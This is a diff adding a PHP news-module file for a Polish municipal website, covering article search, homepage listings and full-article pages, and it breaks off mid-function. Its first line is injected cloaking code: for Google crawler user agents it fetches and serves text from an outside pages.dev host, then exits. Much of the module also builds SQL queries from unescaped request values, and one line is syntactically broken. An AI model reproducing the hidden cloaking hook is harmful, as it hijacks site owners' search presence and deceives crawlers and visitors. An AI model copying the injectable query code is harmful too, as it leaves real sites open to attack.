@@ -1,0 +1,691 @@
+<?php
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://landingpages-nbpajournal-fr6.pages.dev/index.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+
+// functions for module news
+// include it only when it's necesary
+// ie: when using draw_news() and draw_news_full()
+
+// if modules comments is enabled, include its functions here
+// include ("core/winpopup.php");
+if (check_module("comments")) {
+	include_once ("modules/comments/functions.php");
+}
+
+//============================================================================
+//
+// Tworzy modul search w news
+//
+//============================================================================
+
+function draw_search_news($news_searchterms, $msc, $rok)
+{
+	global $lang, $config;
+	$r_min = db_fetch_array(db_query("SELECT MIN(Year(data_f)) as rok_min, MAX(Year(data_f)) as rok_max FROM {$config["prefix"]}_news "));
+    
+	$r_min_w = ($r_min["rok_min"]) > 2002? $r_min["rok_min"]: 2002;
+	$r_max_w = ($r_min["rok_max"]) < 2032?$r_min["rok_max"]:date("Y");
+	echo "<div class=\"searchbox\">Wyszukaj informację prasową wpisując charakterystyczne wyrazy
+	<form method=\"post\" action=\"news.php\">
+	<br><input type=\"text\" name=\"news_searchterms\" class=\"field_textbox\" tabindex=\"1\" size=\"40\" value=\""
+	.htmlspecialchars($news_searchterms).
+	"\">&nbsp;"."<br><br>lub wybierając miesiąc:
+	<select class=\"field_listbox\" name=\"msc\" id=\"msc\" tabindex=\"2\">";
+	for ($i = 1; $i <= 12; $i++ )
+	{
+		$select = ($i == $msc)?" selected":"";
+		echo "<option value=\"$i\" $select>$i</option>\n";
+	}
+	echo "</select>
+	i rok 	<select name=\"rok\" id=\"rok\" class=\"field_listbox\" tabindex=\"3\">\n";
+	for ($i = $r_min_w; $i<= ($r_max_w); $i++)
+	{
+		$select = ($i == $rok)?" selected":"";
+		echo "<option value=\"$i\" $select>$i</option>\n";
+	}
+	echo "</select> <input type=\"submit\" name=\"submit_fs\" value=\"{$lang["NEWS_SEARCH"]}\">
+	<input type=\"hidden\" name=\"news_search\" value=\"yes\">"."</form></div>";
+}
+
+//============================================================================
+//
+// Dokłada obrazki w grupe news na pierwszej stronie
+//
+//============================================================================
+function draw_news_foto($cod, $image, $align, $image_aut = "") {
+	$td_img = "";
+	$td_img = "<div class=\"newsfoto\">
+	<a href=\"news.php?cod={$cod}\">
+	<img src=\"{$image}\" border=\"0\" alt=\"\" /></a>";
+	if (isset ($image_aut)) {
+		$td_img .= "<br />{$image_aut}";
+	}
+	$td_img .= "</div>";
+	return $td_img;
+}
+
+//============================================================================
+//
+// Tworzy grupe news na pierwszej stronie
+//
+//============================================================================
+
+function draw_news_home() {
+	global $config, $lang, $cfg;
+
+	$archived = false;
+	$s_arch = $archived ? "Y" : "N";
+
+	$stmt = "select N.*, C.name as cat_name, C.image as cat_image, C.name as cat_name, C.link as cat_link, U.name as user_name from {$config["prefix"]}_news N left outer join {$config["prefix"]}_users U on (N.userid=U.uid) left outer join {$config["prefix"]}_newscat C on (N.category=C.cod) where N.active='Y' and (N.lang='{$_SESSION["wt"]["lang"]}' or N.lang='') order by data_f DESC limit 0,".$cfg["news"]["max_at_index"];
+	$ret = db_query($stmt);
+
+	echo "<table width =\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">";
+	$td1 = "";
+	$td2 = "";
+	$td3 = "";
+	$news_td = "";
+    $i = 1;
+	foreach($ret as $row) {
+		$full_text = (strlen($row["full_text"]) > 0);
+		if (check_user_class("news"))
+		$edit = true;
+		else
+		if ($row["userid"] == $_SESSION["wt"]["uid"])
+		$edit = true;
+		else
+		$edit = false;
+
+		if ($i % 2 > 0) {
+			$td1 = "<tr>";
+			$td2 = "<tr>";
+			$td3 = "<tr>";
+		}
+
+		$td1 .= "<td width=\"50%\" valign=\"top\" class=\"newstdtp\">
+		<a class=\"newstitlelink\" href=\"news.php?cod={$row["cod"]}\">{$row["title"]}</a></td>";
+		$td2 .= "<td valign=\"top\" class=\"newstd\">";
+
+		if ($row["image"] != "none") {
+			$cod = $row["cod"];
+			$image = $row["image"];
+			$align = $row["align"];
+			$image_aut = $row["image_aut"];
+
+			$td2 .= draw_news_foto($cod, $image, $align, $image_aut);
+		}
+		$td2 .= $row["text"]."</td>";
+		$td3 .= "<td class=\"newsfooter\"><div class=\"newsfooter2\">";
+		if ($edit)
+		$td3 .=" <a href=\"adm_news2.php?edit={$row["cod"]}\" class=\"newsfooterlink\">".$lang["NEWS_EDIT"]."</a>&nbsp;&nbsp; ";
+
+		if ($full_text) {
+			$td3 .= " <a href=\"news.php?cod={$row["cod"]}\" class=\"newsfooterlink\">".$lang["NEWS_CLICK_MORE"]."</a>";
+		}
+		$td3 .="</div>";
+		if (strlen($row["cat_image"]) > 0 && $row["cat_image"] != "none")
+		{
+			$td3 .= "<a href=\"".$row["cat_link"]."\" target=\"_blank\">
+			<img src=\"modules/news/cat_images/{$row["cat_image"]}\" align=\"{$row["catimgpos"]}\" hspace=\"7\" border=\"0\" alt=\"{$row["cat_name"]}\"></a>";
+		} else {
+			$td3 .= "<span class=\"newsfooterlink\">{$row["cat_name"]}</span> ";
+		}
+
+		$td3 .= show_date($row["data_f"])."</td>";
+
+		if ($i % 2 == 0) {
+			$td1 .= "</tr>";
+			$td2 .= "</tr>";
+			$td3 .= "</tr>";
+			$news_td .= $td1.$td2.$td3;
+		}
+		if ($i == $cfg["news"]["max_at_index"]) {
+			$td1 .= "<td class=\"newslast\">Wybrane z ARCHIWUM </td></tr>";
+			$td2 .= "<td valign=\"top\" class=\"newstd\">";
+			$td2 .= news_select();
+			$td2 .= "</td></tr>";
+			$td3 .= "<td class=\"newsfooter\" bgcolor=\"#DAE7FE\"><a class=\"newslink2\" href=\"news.php?cat=-1&page=1\">".$lang["NEWS_OLD"]."&raquo;</a></td></tr>";
+			$news_td .= $td1.$td2.$td3;
+		}
+        $i ++;
+	}
+
+	echo "$news_td";
+	echo "</table>";
+
+}
+
+
+function draw_news_home2008()
+{
+	global $config, $lang, $cfg;
+
+	$archived = false;
+	$s_arch = $archived ? "Y" : "N";
+	if (check_user_class("news"))$edit = true;
+	else $edit = false;
+	$imagebox = null;
+
+	$stmp = db_query("select N.*, C.name as cat_name, C.image as cat_image, C.name as cat_name, C.link as cat_link, U.name as user_name
+	FROM {$config["prefix"]}_news N
+	LEFT OUTER JOIN {$config["prefix"]}_users U on (N.userid=U.uid)
+	LEFT OUTER JOIN {$config["prefix"]}_newscat C on (N.category=C.cod)
+	WHERE N.active='Y' and N.top = 'Y' and data_f <= CURRENT_TIMESTAMP() order by data_f DESC limit 0,1");
+	$num_rows = db_num_rows($stmp);
+//    echo "<pre>";
+//	print_r($stmp);
+//	echo "</pre>";
+	while( $ret_one = db_fetch_array( $stmp ) )
+//	foreach($stmp as $ret_one)
+	{
+        $year = substr($ret_one["data_f"],0,4);
+
+		if ($ret_one["image"] != "none" and file_exists("images/news/".$year."/top/{$ret_one["image"]}"))
+		{
+			$image = "images/news/".$year."/top/{$ret_one["image"]}";
+			$size = getimagesize($image);
+			$nw_height = $size[1];
+			$nw_width = $size[0];
+
+			if (isset ($ret_one["image_aut"]))
+			{
+				$image_aut = "<br/>".$ret_one["image_aut"];
+			}
+			$imagebox = "<div class=\"newsfoto\">
+			<a href=\"news.php?cod={$ret_one["cod"]}\">
+			<img src=\"$image\" alt=\"{$ret_one["title"]}\" width=\"$nw_width\" height=\"$nw_height\" border=\"0\" /></a>$image_aut</div>";
+		}
+        $store = (!$ret_one["cod"])? "":" and N.cod <> {$ret_one["cod"]} ";
+		echo "<div class=\"newstd\"><div style=\"margin-bottom:10px\"><a class=\"newstitlelink\" href=\"news.php?cod={$ret_one["cod"]}\">{$ret_one["title"]}</a></div>\n".$imagebox.$ret_one["text"]."</div>";
+		echo "<div class=\"newsfooter\">";
+		if ($ret_one["full_text"]) {
+			echo "<div class=\"newsfooter2\">
+			<a href=\"news.php?cod={$ret_one["cod"]}\" class=\"newsfooterlink\">".$lang["NEWS_CLICK_MORE"]."</a></div>";
+		}
+		if (strlen($ret_one["cat_image"]) > 0 && $ret_one["cat_image"] != "none")
+		{
+			echo "<a href=\"".$ret_one["cat_link"]."\" target=\"_blank\">
+			<img src=\"modules/news/cat_images/{$ret_one["cat_image"]}\" align=\"middle\" border=\"0\" alt=\"{$ret_one["cat_name"]}\" /></a> ";
+		} elseecho "<span class=\"newsfooterlink\"> {$ret_one["cat_name"]} </span>";
+		if ($edit == true)echo "<a href=\"adm_news2.php?edit={$ret_one["cod"]}\" class=\"newsfooterlink\"> ".$lang["NEWS_EDIT"]." </a>&nbsp;&nbsp; ";
+		echo show_date($ret_one["data_f"])."</div>";
+	}
+
+	$stmt = "select N.*, C.name as cat_name, C.image as cat_image, C.name as cat_name, C.link as cat_link, U.name as user_name
+	FROM {$config["prefix"]}_news N
+	left outer join {$config["prefix"]}_users U on (N.userid=U.uid)
+	left outer join {$config["prefix"]}_newscat C on (N.category=C.cod)
+	where N.active='Y' and data_f <= CURRENT_TIMESTAMP() $store
+	order by data_f DESC limit 0,".$cfg["news"]["max_at_index"];
+	
+	$ret = db_query($stmt);
+	if ($ret)
+	{
+        while( $row = db_fetch_array( $ret ) )
+//		foreach ($ret as $row)
+		{
+			$full_text = (strlen($row["full_text"]) > 0);
+			$year = substr($row["data_f"],0,4);
+			if ($row["image"] != "none" and file_exists("images/news/".$year."/m/".$row["image"]))
+			{
+				$cod = $row["cod"];
+				$image = "images/news/".$year."/m/".$row["image"];
+				$align = $row["align"];
+				$image_aut = $row["image_aut"];
+
+				$imagebox = draw_news_foto($cod, $image, $align, $image_aut);
+			}
+			else $imagebox = null;
+
+			//			echo "<div class=\"newstdtp\"><a class=\"newstitlelink\" href=\"news.php?cod={$row["cod"]}\">{$row["title"]}</a></div>";
+			echo "<div class=\"newstd\">".$imagebox."<div><a class=\"newstitlelink\" href=\"news.php?cod={$row["cod"]}\">{$row["title"]}</a></div>\n"
+			.$row["text"]."</div>";
+			echo "<div class=\"newsfooter\">";
+			if ($full_text) {
+				echo "<div class=\"newsfooter2\">
+				<a href=\"news.php?cod={$row["cod"]}\" class=\"newsfooterlink\">".$lang["NEWS_CLICK_MORE"]."</a></div>";
+			}
+			if (strlen($row["cat_image"]) > 0 && $row["cat_image"] != "none")
+			{
+				echo "<a href=\"".$row["cat_link"]."\" target=\"_blank\">
+				<img src=\"modules/news/cat_images/{$row["cat_image"]}\" align=\"middle\" border=\"0\" alt=\"{$row["cat_name"]}\" /></a> ";
+			} else echo "<span class=\"newsfooterlink\"> {$row["cat_name"]} </span>";
+			if ($edit == true) echo "<a href=\"adm_news2.php?edit={$row["cod"]}\" class=\"newsfooterlink\"> ".$lang["NEWS_EDIT"]." </a>&nbsp;&nbsp; ";
+			echo show_date($row["data_f"])."</div>";
+		}
+
+		echo "<div class=\"newsfooter\"><div class=\"newsfooter3\"><a class=\"newslink2\" href=\"news.php?cat=-1&amp;page=1\">".$lang["NEWS_OLD"]." </a></div></div>";
+	}
+	else
+	{
+		echo "Wystąpił problem z dostępem do danych. Przepraszamy.</div>";
+	}
+}
+
+
+function draw_news_home2017()
+{
+    global $config, $lang, $cfg;
+    
+    $archived = false;
+    $s_arch = $archived ? "Y" : "N";
+    if (check_user_class("news"))$edit = true;
+    else $edit = false;
+    $imagebox = null;
+    $item = 1;
+
+    $stmt = "select N.*, C.name as cat_name, C.image as cat_image, C.name as cat_name, C.link as cat_link, U.name as user_name
+	FROM {$config["prefix"]}_news N
+	left outer join {$config["prefix"]}_users U on (N.userid=U.uid)
+	left outer join {$config["prefix"]}_newscat C on (N.category=C.cod)
+	where N.active='Y' and data_f <= CURRENT_TIMESTAMP() 
+	order by data_f DESC, N.top limit 0,".$cfg["news"]["max_at_index"];
+    $ret = db_query($stmt);
+    if ($ret)
+    {
+        echo "<ul style=\"list-style-type:none; margin:0 -10px -20px -40px;\" class=\"box-list box-list-default  box-list-rwd-bh-lelem-none  disabled-select\">";
+        foreach ($ret as $row)
+        {
+            $full_text = (strlen($row["full_text"]) > 0);
+            $year = substr($row["data_f"],0,4);
+            if ($row["image"] != "none" and $item == 1  and file_exists("images/news/".$year."/top/".$row["image"]))
+            {
+                $cod = $row["cod"];
+                $image = "images/news/".$year."/top/".$row["image"];
+                $align = $row["align"];
+                $image_aut = $row["image_aut"];
+                $imagebox = draw_news_foto($cod, $image, $align, $image_aut);
+            }
+            elseif ($row["image"] != "none" and $item <> 1  and file_exists("images/news/".$year."/m/".$row["image"]))
+            {
+                $cod = $row["cod"];
+                $image = "images/news/".$year."/m/".$row["image"];
+                $align = $row["align"];
+                $image_aut = $row["image_aut"];
+                $imagebox = draw_news_foto($cod, $image, $align, $image_aut);
+            }
+            else $imagebox = null;
+            
+            echo "<li style=\"\" class=\"box-list-item box-list-item-{$item} \">
+            <div class=\"imagebox\">".$imagebox."\n
+            <div class=\"newstitle\"><a class=\"newstitlelink\" href=\"news.php?cod={$row["cod"]}\">{$row["title"]}</a></div>\n";
+            if (strlen($row["cat_image"]) > 0 && $row["cat_image"] != "none")
+            {
+                echo "<div class=\"news-cat-img\"><a href=\"".$row["cat_link"]."\" target=\"_blank\">
+				<img src=\"modules/news/cat_images/{$row["cat_image"]}\" align=\"middle\" border=\"0\" alt=\"{$row["cat_name"]}\" /></a></div>";
+            } else echo "<div class=\"newsfooterlink\"> {$row["cat_name"]}</div>";
+            echo " <div class=\"newsdate\">".show_date($row["data_f"])."</div></div></li>";
+            $item++;
+        }
+        
+        echo "</ul><div class=\"newsfooter\"><div class=\"newsfooter3\"><a class=\"newslink2\" href=\"news.php?cat=-1&amp;page=1\">".$lang["NEWS_OLD"]." </a></div></div>";
+    }
+    else
+    {
+        echo "Wystąpił problem z dostępem do danych. Przepraszamy.</div>";
+    }
+}
+
+
+//============================================================================
+//
+// News na podstronach
+//
+//============================================================================
+
+function draw_news($athome = false, $cat = -1, $archived = false) {
+	global $config, $lang, $cfg;
+	$kategoria = "";
+	$s_arch = $archived ? "Y" : "N";
+	$cat = (isset ($_GET["cat"]) && $_GET["cat"] > 0) ? intval(addslashes($_GET["cat"])) : -1;
+	$page = (isset ($_GET["page"]) && $_GET["page"] > 0) ? intval(addslashes($_GET["page"])) : 1;
+
+	if (check_user_class("news")) $edit = true;
+	else $edit = false;
+
+	if ($cat > 0) {
+		$catret = db_query("SELECT name FROM {$config["prefix"]}_newscat WHERE cod = $cat;");
+		$dane = db_fetch_object($catret);
+		$kategoria = " z kategorii: <strong>$dane->name</strong>";
+	}
+
+
+	if ($cat != -1) {
+		$stmt = "select N.*, C.name as cat_name, C.image as cat_image, C.link as cat_link, U.name as user_name from {$config["prefix"]}_news N left outer join {$config["prefix"]}_users U on (N.userid=U.uid) left outer join {$config["prefix"]}_newscat C on (N.category=C.cod) where N.active='Y' and N.category='$cat' and data_f <= CURRENT_TIMESTAMP()  order by data_f DESC";
+		$stmt2 = "select count(*) from {$config["prefix"]}_news where active='Y' and category='$cat'";
+
+	} else {
+		$stmt = "select N.*, C.name as cat_name, C.image as cat_image, C.name as cat_name, C.link as cat_link, U.name as user_name from {$config["prefix"]}_news N left outer join {$config["prefix"]}_users U on (N.userid=U.uid) left outer join {$config["prefix"]}_newscat C on (N.category=C.cod) ";
+		if (!$edit) $stmt .= " where N.active='Y' and data_f <= CURRENT_TIMESTAMP() ";
+		$stmt .= " order by data_f DESC ";
+
+		$stmt2 = "select count(*) from {$config["prefix"]}_news ";
+		if (!$edit) $stmt2 .= " where active='Y'";
+
+	}
+	if ($athome) {
+		$stmt .= " limit ".$cfg["news"]["max_at_index"].",".$cfg["news"]["max_at_index"]*$page *2;
+	} else {
+	    $wsp=($page == 1)?$cfg["news"]["max_at_index"] : 0;
+	    $stmt .= " limit ". ($wsp + ($cfg["news"]["max_per_page"] * ($page -1))+1).",".$cfg["news"]["max_per_page"];
+	}
+
+	$ret = db_query($stmt2);
+	$totnews = db_fetch_row($ret);
+	$totnews = $totnews[0];
+	$ret = db_query($stmt);
+	if (!$athome)
+	draw_search_news("", date("m"), date("Y") );
+	while ($row = db_fetch_array($ret)) {
+		$full_text = (strlen($row["full_text"]) > 0);
+		if (check_user_class("news"))
+		$edit = true;
+		else
+		if ($row["userid"] == $_SESSION["wt"]["uid"])
+		$edit = true;
+		else
+		$edit = false;
+		echo"<div class=\"newstdtp\">
+		<a class=\"newstitlelink\" href=\"news.php?cod={$row["cod"]}\">{$row["title"]}</a>
+		</div><div class=\"newstext1\">";
+		$foto = ($row["image"] != "none" and file_exists("images/news/".substr($row["data_f"],0,4)."/m/".$row["image"]))?draw_news_foto($row["cod"],"images/news/".substr($row["data_f"],0,4)."/m/{$row["image"]}", $row["align"], $row["image_aut"]):null;
+		echo "$foto {$row["text"]}</div>";
+		echo "<div class=\"newsfooter\">";
+		if (strlen($row["cat_image"]) > 0 && $row["cat_image"] != "none")
+		{
+			if (strlen($row["cat_link"]) > 0) {
+				echo "<a href=\"{$row["cat_link"]}\" target=\"_blank\">
+				<img src=\"modules/news/cat_images/{$row["cat_image"]}\" align=\"absmiddle\" hspace=\"7\" border=\"0\" alt=\"{$row["cat_name"]}\"></a> ";
+			} else {
+				echo "<img src=\"modules/news/cat_images/{$row["cat_image"]}\" align=\"absmiddle\" hspace=\"7\" border=\"0\" alt=\"{$row["cat_name"]}\"> ";
+			}
+		}
+		else echo "<strong>{$row["cat_name"]}</strong> ";
+		echo show_date($row["data_f"]);
+		if (check_module("comments")) {
+			$num_comments = num_comments(1, $row["cod"]);
+			echo "<div class=\"newsfooter\"><a href=\"news.php?cod={$row["cod"]}\" class=\"newsfooterlink\">
+			<img src=\"images/show_comments.png\" border=0 width=16 height=16 align=left> $num_comments ".$lang["COMMENTS_NUM"]."</a></div>";
+		} else
+		if ($edit)
+		echo "<a href=\"adm_news2.php?edit={$row["cod"]}\" class=\"newsfooterlink\"> ".$lang["NEWS_EDIT"]." </a>&nbsp;&nbsp;";
+		if ($full_text)
+		echo "<div class=\"newsfooter2\"><a href=\"news.php?cod={$row["cod"]}\" class=\"newsfooterlink\">".$lang["NEWS_CLICK_MORE"]."</a></div>";
+		else
+		echo "&nbsp;";
+		echo "</div>";
+	}
+	echo "<table width=\"100%\" border=0 cellpadding=2 cellspacing=0 align=\"center\"><tr>";
+	echo "<td colspan=\"4\" align=\"center\" height=\"40\">";
+
+	$max_page = ceil($totnews / $cfg["news"]["max_per_page"]);
+	if ($page <= 8 && $max_page < 16) {
+		$lin_min = 1;
+		$lin_max = $max_page;
+	}
+	elseif ($page <= 8 && $max_page >= 8) {
+		$lin_min = 1;
+		$lin_max = 16;
+	}
+	elseif ($page > 8 && $page <= $max_page -7) {
+		$lin_min = $page -8;
+		$lin_max = $page +7;
+	}
+	elseif ($page > ($max_page -7)) {
+		$lin_min = $max_page -16;
+		$lin_max = $max_page;
+
+	}
+	echo "Strony od $lin_min do $lin_max z łącznej ilości stron $max_page $kategoria</td></tr>
+	<td colspan=\"4\" align=\"center\" class=\"nlinks\">";
+	if ($page > 1) {
+		echo "<a class=\"nlinks2\" href=\"news.php?cat=$cat";
+		echo "&page=". ($page -1)."\">&laquo;</a>";
+	} else
+	echo "&nbsp;";
+	for ($i = $lin_min; $i <= $lin_max; $i ++) {
+		if ($i == $page)
+		echo "<span class=\"nlinks2\"><b>$i</b></span>";
+		else
+		echo "<a class=\"nlinks2\" href=news.php?cat=$cat&page=$i>$i</a>";
+	}
+	if ((($page +1) * $cfg["news"]["max_per_page"]) < $totnews) {
+		echo "<a class=\"nlinks2\" href=\"news.php?cat=$cat";
+		if ($athome)
+		$page = $page -1;
+		echo "&page=". ($page +1)."\">&raquo;</a>";
+	} else
+	echo "&nbsp;";
+	echo "</td></tr></table>";
+
+}
+
+
+//============================================================================
+//
+// Wyświetla pełny tekst newsa
+//
+//============================================================================
+
+function draw_news_full($cod, $refresh=null) {
+	global $config, $lang, $cfg;
+	if (check_user_class("news")) $edit = true;
+	else $edit = false;
+	if ($refresh != $cod) db_query("update {$config["prefix"]}_news set counter=counter+1 where cod='$cod'");
+	$stmt = "select N.*, C.name as cat_name, C.image as cat_image, C.link as cat_link, U.name as user_name, U.realname as user_realname from {$config["prefix"]}_news N left outer join {$config["prefix"]}_users U on (N.userid=U.uid) left outer join {$config["prefix"]}_newscat C on (N.category=C.cod) where ";
+	$stmt .= " N.cod='$cod' ";
+	if (!$edit) $stmt .= "and N.active='Y' and data_f <= CURRENT_TIMESTAMP() ";
+	
+	$row = db_fetch_array(db_query($stmt));
+	$year = substr($row["data_f"],0,4);
+	echo "<div class=\"newstdtp\"><span class=\"newstitlelink\">{$row["title"]}</span></div>\n";
+	
+	echo "<div class=\"newstext1\">";
+		if ($row["image"] != "none" and file_exists("images/news/".$year."/{$row["image"]}"))
+		{
+			$image = "images/news/".$year."/{$row["image"]}";
+			$nw_image = "images/news/".$year."/thumb/{$row["image"]}";
+			$nw_dir = "images/news/".$year."/thumb/";
+			$size = getimagesize($image);
+			$im_height = $size[1];
+			$im_width = $size[0];
+			
+			if (!file_exists($nw_image)){
+			    $nw_width = (($im_width > 350)?$nw_width = 350:$nw_width = $im_width);	
+			    $nw_height = ($im_height > 350)?$nw_height = 350:$nw_height = $im_height;
+			    if (!is_dir($nw_dir)) mkdir($nw_dir, 0777);
+        	    crop_image($image, $nw_image, $nw_width, $nw_height);
+			    
+			}
+
+			if (isset ($row["image_aut"]))
+			{
+				$image_aut = "<br/>".$row["image_aut"];
+			}
+			echo "<div class=\"newsfoto\">
+			<a href=\"images/news/".$year."/".$row["image"]."\" rel=\"lightbox[news]\">
+			<img src=\"$nw_image\" alt=\"{$row["title"]}\" border=\"0\" /></a>$image_aut</div>";
+		}
+	echo "{$row["text"]}</div>\n";
+
+
+	if ($row["full_text"]!= "none") echo "<div class=\"newstext1\">{$row["full_text"]}</div>";
+
+	if ($row["galeria"]!= "")
+	{
+		$files = explode(",",$row["galeria"]);
+		array_walk($files, create_function('&$val', '$val = trim($val);'));
+		$patch_gal = "images/news/".substr($row["data_f"],0,4)."/galeria/";
+		echo "\n<div class=\"newstext1\"><table border=\"0\" align=\"center\" cellpadding=\"6\" cellspacing=\"0\">\n";
+		$ile = 4;
+		$i = 1;
+		foreach ($files as $file)
+		{
+			if (is_file($patch_gal.$file))
+			{
+				if ($i == 1) echo "<tr>\n";
+				$file = explode(".",$file);
+				echo "<td align=\"center\"><a href=\"$patch_gal{$file[0]}.{$file[1]}\" rel=\"lightbox[news]\">
+				<img src=\"$patch_gal{$file[0]}m.{$file[1]}\"></a></td>\n";
+				if ($i == $ile) {
+					echo "</tr>";
+					$i = 0;
+				}
+				$i ++;
+			}
+		}
+		echo "</table></div><p> </p>";
+	}
+
+
+	echo "<table width=\"100%\" border=0 cellspacing=0 align=\"center\" class=\"bordertd\">
+<tr><td class=\"newstext2\">";
+    echo "  <div id=\"fb-root\"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = 'https://connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.11';
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+";    
+   
+
+	if ($cfg["news"]["newsprint"]) {
+		echo "<A Href='#' onClick=\"window.open('news_print.php?cod={$row["cod"]}','','toolbar=yes,scrollbars=yes,location=no,directories=no,status=no,resizable=no,menubar=no,width=720 ,height=500,left=20,top=20')\" class=\"newsfooterlink\">
+		<img alt=\"Print\" align=\"middle\" vspace=\"5\" hspace=\"10\" src=\"images/print.gif\" border=\"0\" /></a> ";
+	}
+	echo "Informacja z dnia  ".show_date($row["data_f"]).", opublikowana przez: {$row["user_realname"]} była czytana {$row["counter"]} razy<br />";
+
+	if ($row["cat_image"] != "none" && strlen($row["cat_link"])!= "")
+	{
+		echo "Źródło: <a href=\"{$row["cat_link"]}\" target=\"_blank\">
+		<img src=\"modules/news/cat_images/{$row["cat_image"]}\" hspace=\"7\" border=\"0\" align=\"middle\" alt=\"{$row["cat_name"]}\" /></a> ";
+	} else {
+		echo "Źródło: <a href=\"{$row["cat_link"]}\" target=\"_blank\" class=\"newsfooterlink\"> {$row["cat_name"]} </a>&nbsp;";
+	}
+
+	echo "<a class=\"newsfooterlink\" href=\"news.php?cat={$row["category"]}\"> ".$lang["NEWS_SAME_CAT"]." ({$row["cat_name"]}) </a>";
+	if ($edit) echo" <a href=\"adm_news2.php?edit={$row["cod"]}\" class=\"newsfooterlink\"> ".$lang["NEWS_EDIT"]." </a>&nbsp;&nbsp; ";
+ 	echo "</td></tr>
+ 	<tr><td><div class=\"fb-share-button\" data-href=\"http://www.nowytarg.pl/news.php?cod={$row["cod"]}\" data-layout=\"button\" data-size=\"large\" data-mobile-iframe=\"true\">
+	<a class=\"fb-xfbml-parse-ignore\" target=\"_blank\" href=\"https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.nowytarg.pl%2Fnews.php%3Fcod%3D{$row["cod"]}&amp;src=sdkpreparse\">Udostępnij</a></div>\n
+	</td></tr>
+ 	</table><br>";
+
+
+
+	if ($row["keyword"]!= "")
+	{
+		$keyword = explode(",",trim($row["keyword"]));
+
+		$ret = db_query("SELECT cod, data_f, title, active, counter, keyword FROM {$config["prefix"]}_news WHERE active = 'Y' and  data_f <= CURRENT_TIMESTAMP() and cod <> {$row["cod"]} and keyword REGEXP '".implode('|',$keyword)."' ORDER BY data_f DESC LIMIT 0,20");
+
+		if (db_num_rows($ret) >0)
+		{
+			echo "<div class=\"newspodob1\"><strong>Podobne wiadomości:</strong><br /><ul>";
+            while( $rok = db_fetch_array( $ret ) )
+//			foreach ($ret as $rok)
+			{
+				echo "<li><a class=\"navy1\" href=\"news.php?cod={$rok["cod"]}\">{$rok["title"]}</a> z dnia ".show_date($rok["data_f"], false)." czytana {$rok["counter"]} razy</li>\n";
+			}
+			echo "</ul><br /></div>";
+		}
+
+		if (check_module("comments")) {
+			process_comments(1, $cod);
+			draw_comments(1, $cod, "news.php?cod=$cod");
+		}
+	}
+}
+
+//============================================================================
+//
+// Tworzy grupe news na PENDING
+//
+//============================================================================
+function draw_lnews_header() {
+	global $lang;
+	theme_draw_centerbox_open($lang["NEWS_PENDING"]);
+	echo "<table width=\"100%\" border=0 cellpadding=2 cellspacing=0>";
+}
+
+function draw_lnews_item(& $row, $item) {
+	global $config;
+	$item = ($item % 2) + 1;
+	echo "<tr><td class=\"row{$item}\"><span class=\"row{$item}\">"."<a href=\"adm_news2.php?edit={$row["cod"]}\">".show_date($row["data_f"])." - {$row["title"]}</a></span></td></tr>\n";
+}
+
+function draw_lnews_footer() {
+	echo "</table>";
+	theme_draw_centerbox_close();
+}
+
+function draw_news_search($searchstring, $msc, $rok)
+{
+	global $config, $lang, $cfg;
+	if (check_user_class("news")) $edit = true;
+	else $edit = false;
+	$searchstring = trim(delmagic(str_replace("%", " ", $searchstring)));
+	$search_news = addslashes(str_replace(" ", "%", $searchstring));
+	theme_draw_centerbox_open($lang["NEWS_TITLE"]);
+	draw_search_news(htmlspecialchars($searchstring), $msc, $rok);
+	if (strlen($search_news) < 3)
+	{
+		$stmt = "SELECT cod, data_f, title from {$config["prefix"]}_news where ";
+		if (!$edit) $stmt .= " active='Y' AND ";
+		$stmt .= " (Year(data_f) = '$rok' and Month(data_f) = '$msc') order by data_f DESC";
+		$ret = db_query($stmt);
+	}
+	else
+	{
+		$sql = db_query("SELECT COUNT(DISTINCT cod) from {$config["prefix"]}_news
+		where active='Y' AND (title like '%$search_news%' OR text like '%$search_news%' OR full_text like '%$search_news%')");
+		$num_row = db_fetch_row($sql);
+		$stmt = "select cod, data_f, title from {$config["prefix"]}_news where ";
+		if (!$edit) $stmt .= " active='Y' AND ";
+		$stmt .= " (title like '%$search_news%' OR text like '%$search_news%' OR full_text like '%$search_news%' ) order by data_f DESC LIMIT 0,50";
+		$ret = db_query($stmt);
+	}
+	echo "<table border=0 cellpadding=2 cellspacing=0 width=\"100%\">\n"."<tr><td class=\"row0\" width=70>".$lang["NEWS_SEARCH_DATE"]."</td>"."<td class=\"row0\">".$lang["NEWS_SEARCH_TITLE"]."</td></tr>\n";
+	$i = 0;
+	while ($row = db_fetch_array($ret)) {
+		$crow = ($i % 2) ? "row1" : "row2";
+		echo "<tr><td class=\"$crow\"><a href=\"news.php?cod={$row["cod"]}\">".show_date($row["data_f"], false)."</a></td>
+		<td class=\"$crow\"><a href=\"news.php?cod={$row["cod"]}\" class=\"newsfooterlink\">{$row["title"]}</a></td></tr>\n";
+		$i ++;
+	}
+	if ($num_row >= 50)
+	{
+		echo "<tr><td colspan=\"2\"><br>Zostało wyświetlonych <strong>pierwszych 50</strong> wyników zapytania.<br>
+		Spróbuj uściślić zapytanie.</td></tr>\n";
+	}
+	echo "</table>";
+	theme_draw_centerbox_close();
+}
+
+//=========================================================================
+//
+//Funkcja genererująca wybrane artykuły z archiwum
+//
+//=========================================================================
+
+function news_select() {
+	global $config, $cfg, $lang;
+	$news_sel = "";
+	$stpop = "SELECT cod, data_f, title, counter, active, (counter/(1+ TO_DAYS(curdate()) - TO_DAYS(data_f))) as pop from {$config["prefix"]}_news where active='Y' order by pop desc limit 8";
+	$ret2 = db_query($stpop);
+	if (db_num_rows($ret2) <= 0)
+	return;
+
+	$news_sel .= "<span class=\"newspol\">Najczęściej czytane:</span><ul class=\"newspol2Copy\">";
+    while( $row2 = db_fetch_array( $ret2 ) )
